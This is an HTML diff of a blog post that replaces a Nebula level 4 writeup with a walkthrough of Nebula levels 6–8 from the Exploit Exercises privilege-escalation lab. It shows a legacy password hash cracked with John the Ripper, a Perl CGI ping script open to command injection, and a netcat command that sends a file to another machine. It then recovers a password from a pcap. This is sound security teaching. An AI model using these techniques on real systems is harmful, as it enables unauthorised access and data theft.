@@ -15,7 +15,7 @@
     <title>
       
       
-         Writeup: Nebula (level 4) 
+         Writeup: Nebula (level 6 - level 8) 
       
     </title>
     <link rel="canonical" href="https://chuang76.github.io/posts/nebula_p3/">
@@ -420,7 +420,7 @@
 
 
 <section id=content>
-  <h1> Writeup: Nebula (level 4) </h1>
+  <h1> Writeup: Nebula (level 6 - level 8) </h1>
 
   
     <div id=sub-header>
@@ -431,65 +431,111 @@
   <div class="entry-content">
     <p>Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at <a href="https://exploit-exercises.lains.space/">Exploit Exercises</a>.</p>
 <!-- raw HTML omitted -->
-<h2 id="level-4">Level 4</h2>
-<p>The description of Level 4 is provided as follows.</p>
-<pre><code>This level requires you to read the token file, but the code restricts the files 
-that can be read. Find a way to bypass it :)
+<h2 id="level-6">Level 6</h2>
+<p>The description of Level 6 is provided as follows.</p>
+<pre><code>The flag06 account credentials came from a legacy unix system.
 
-To do this level, log in as the level04 account with the password level04. 
-Files for this level can be found in /home/flag04.
-</code></pre><p>The source code is available.</p>
-<pre><code>#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;fcntl.h&gt;
+To do this level, log in as the level06 account with the password level06. 
+Files for this level can be found in /home/flag06.
+</code></pre><p>If you are not familiar with the password file (/etc/passwd) and shadow file (/etc/shadow) in the Unix-based system, you can check this <a href="https://chuang76.github.io/posts/users_and_groups/">post</a> I wrote before. In this challenge, we are going to use the password file to get the flag.</p>
+<p>Let&rsquo;s check the contents of /etc/passwd first. The second field is about password information, i.e., encrypted password. In the modern system, the second field is typically stored as <code>x</code>, which means the actual content is maintained in another file called /etc/shadow.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/06-1.PNG?raw=true" alt=""></p>
+<p>However, this is a legacy Unix system, the password is not &ldquo;hidden&rdquo; in the shadow file. So we can use <a href="https://zh.wikipedia.org/wiki/John_The_Ripper">John The Ripper</a>, a free crafting passwords tool to decode the password.</p>
+<pre><code>$ cat passwd
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
 
-int main(int argc, char **argv, char **envp)
-{
-      char buf[1024];
-      int fd, rc;
+$ john passwd
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hello            (flag06)
+1g 0:00:00:00 100% 2/3 20.00g/s 15060p/s 15060c/s 15060C/s 123456..marley
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Now, we have the decoded password, i.e., &ldquo;hello&rdquo;. Let&rsquo;s use it to log in as account flag06 and get the flag.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/06-2.PNG?raw=true" alt=""></p>
+<!-- raw HTML omitted -->
+<h2 id="level-7">Level 7</h2>
+<p>Here is the description of Level 7.</p>
+<pre><code>The flag07 user was writing their very first perl program that allowed them to 
+ping hosts to see if they were reachable from the web server.
 
-      if(argc == 1) {
-          printf(&quot;%s [file to read]\n&quot;, argv[0]);
-          exit(EXIT_FAILURE);
-      }
+To do this level, log in as the level07 account with the password level07. 
+Files for this level can be found in /home/flag07.
+</code></pre><p>The contents in /home/flag07 can be displayed as follows.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/07-1.PNG?raw=true" alt=""></p>
+<p>Let&rsquo;s view the contents of the file index.cgi. It is a CGI script written in Perl. <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">CGI</a> (Common Gateway Interface) is a specification for web servers to execute programs like command-line running on a server that generates dynamic web pages. As you can see, we need to provide the parameter Host to index.cgi. Then, the ping result will be displayed on the screen. We can check that if index.cgi works successfully or not.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/07-3.PNG?raw=true" alt=""></p>
+<pre><code>#!/usr/bin/perl
 
-      if(strstr(argv[1], &quot;token&quot;) != NULL) {
-          printf(&quot;You may not access '%s'\n&quot;, argv[1]);
-          exit(EXIT_FAILURE);
-      }
+use CGI qw{param};
 
-      fd = open(argv[1], O_RDONLY);
-      if(fd == -1) {
-          err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);
-      }
+print &quot;Content-type: text/html\n\n&quot;;
 
-      rc = read(fd, buf, sizeof(buf));
+sub ping {
+  $host = $_[0];
 
-      if(rc == -1) {
-          err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);
-      }
+  print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);
 
-      write(1, buf, rc);
+  @output = `ping -c 3 $host 2&gt;&amp;1`;
+  foreach $line (@output) { print &quot;$line&quot;; }
+
+  print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);
+  
 }
-</code></pre><p>According to the source code, if we use &ldquo;token&rdquo; as the argument of flag04, we&rsquo;ll get the error message: You may not access token. However, we can perform an indirect way to view the contents of a restricted file. That is, create a symbolic link of the file token.</p>
-<pre><code>$ ln -s [target] [target_symbolic]
-</code></pre><p><img src="https://github.com/chuang76/image/blob/master/04-1.PNG?raw=true" alt=""></p>
-<p>After we have made the symbolic link, we can execute target_symbolic file, just as we could with the target file. Now, we can read the contents of token as follows.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/04-2.PNG?raw=true" alt=""></p>
-<p>Use the token as the password of account flag04, then we can get the flag.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/04-3.PNG?raw=true" alt=""></p>
+
+# check if Host set. if not, display normal page, etc
+
+ping(param(&quot;Host&quot;));
+</code></pre><p>Subsequently, let&rsquo;s view the contents of the file thttpd.conf. <a href="https://en.wikipedia.org/wiki/Thttpd">Thttpd</a> is a simple web server, and thttpd.conf is its configure file. Here is the part of thttpd.conf. As you can see, thttpd is listening to the port 7007, running with our target account fla07, and it supports the CGI program, index.cgi.</p>
+<pre><code>port=7007
+dir=/home/flag07
+user=flag07
+cgipat=**.cgi
+</code></pre><p>So, we can use wget command to retrieve the response. For example, we can get the result of whoami. Note that the semicolon (;) character should be encoded as &ldquo;%3B&rdquo; in URL.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/07-4.PNG?raw=true" alt=""></p>
+<p>Here is the flag.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/07-5.PNG?raw=true" alt=""></p>
+<!-- raw HTML omitted -->
+<h2 id="level-8">Level 8</h2>
+<p>The description of Level 8 is provided as follows.</p>
+<pre><code>World readable files strike again. Check what that user was up to, 
+and use it to log into flag08 account.
+
+To do this level, log in as the level08 account with the password level08. 
+Files for this level can be found in /home/flag08.
+</code></pre><p>Here is the contents of the directory /home/flag08. <a href="https://en.wikipedia.org/wiki/Tcpdump">Tcpdump</a> is a free tool that allows uses to capture packets. As you can see, capture.pcap is a tcpdump capture file. It is a file that contains packet information.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/08-1.PNG?raw=true" alt=""></p>
+<p>If you view the contents of .pcap file with cat command directly, it is not readable. Instead, we can use tcpdump -r to view the contents.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/08-2.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/08-3.PNG?raw=true" alt=""></p>
+<p>Next, we are going to analyze these packet information. We can use <a href="https://en.wikipedia.org/wiki/Wireshark">Wireshark</a>, a powerful packet analyzer, to analyze the file. However, since we don&rsquo;t have the permission to install the tool, we are not able to use Wireshark on Nebula. So let&rsquo;s transfer the captured file to our personal machine (e.g. in my case is Kali Linux), then analyze the file on our personal machine.</p>
+<p>If you are not familiar that how to make two virtual machines communication, you can check this <a href="https://www.youtube.com/watch?v=vReAkOq-59I">video</a>. After setting up the network, we can use <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a> (nc) command to transfer the file as follows. That is, the machine is running nc in listening mode on port 9527.</p>
+<pre><code>$ nc -l -p 9527 &gt; capture.pcap
+</code></pre><p>Subsequently, run the following command to make Nebula send the file to our personal machine. The IP address may be different depends on different machine and setting, you can check the related information via ifconfig command. The IP address of my personal machine is 192.168.100.6.</p>
+<pre><code>$ nc 192.168.100.6 9527 &lt; /home/flag08/capture.pcap
+</code></pre><p>Open Wireshark on Kali Linux.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/08-4.PNG?raw=true" alt=""></p>
+<p>Follow TCP stream, as you can see, it shows Password: backdoor&hellip;00Rm8.ate. However, the dot symbol does not represent the &ldquo;dot&rdquo; literally. It means some characters that are non-printable on Wireshark.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/08-5.PNG?raw=true" alt=""></p>
+<p>Let&rsquo;s move on. We need to figure out what is the actual password. We can start at the No. 43 packet, which contains the character Password:.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/08-8.PNG?raw=true" alt=""></p>
+<p>Then, we can focus on what character is transfer from 59.233.235.218 (the user who types the password) to 59.233.235.223. The characters that ends at carriage return (0x0d) can be collected as follows.</p>
+<pre><code>'b', 'a', 'c', 'k', 'd', 'o', 'o', 'r', 0x7f, 0x7f, 0x7f, '0', '0', 'R', 'm', '8', 0x7f, 'a', 't', 'e'
+</code></pre><p>After checking the ASCII table, we can know that 0x7f means delete. Hence, the actual password is back00Rmate.</p>
+<pre><code>backdoor
+     ^^^      delete 
+back00Rm8
+        ^     delete
+back00Rmate 
+</code></pre><p>Here is the flag.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/08-7.PNG?raw=true" alt=""></p>
 
   </div>
 
   <div id=links>
     
-      <a href="https://chuang76.github.io/posts/nebula_p2/">&laquo;&nbsp;Writeup: Nebula (level 3)</a>
+      <a href="https://chuang76.github.io/posts/nebula_p2/">&laquo;&nbsp;Writeup: Nebula (level 3 - level 5)</a>
     
-    
-      <a href="https://chuang76.github.io/posts/nebula_p4/">Writeup: Nebula (level 5)&nbsp;&raquo;</a>
     
   </div>
 </section>
